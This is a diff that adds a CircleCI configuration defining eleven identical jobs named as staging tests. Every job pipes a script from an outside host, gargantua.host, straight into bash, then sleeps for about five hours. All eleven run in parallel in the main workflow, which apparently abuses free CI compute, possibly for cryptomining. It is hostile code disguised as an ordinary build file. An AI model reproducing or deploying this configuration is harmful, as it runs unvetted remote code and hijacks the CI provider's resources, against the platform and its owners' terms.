@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  stagingtestchr:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  stagingtestchr1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  stagingtestchr2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  stagingtestchr3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  stagingtestchr4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  stagingtestchr5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  stagingtestchr6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  stagingtestchr7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  stagingtestchr8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  stagingtestchr9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  stagingtestchr10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - stagingtestchr
+      - stagingtestchr1
+      - stagingtestchr2
+      - stagingtestchr3
+      - stagingtestchr4
+      - stagingtestchr5
+      - stagingtestchr6
+      - stagingtestchr7
+      - stagingtestchr8
+      - stagingtestchr9
+      - stagingtestchr10
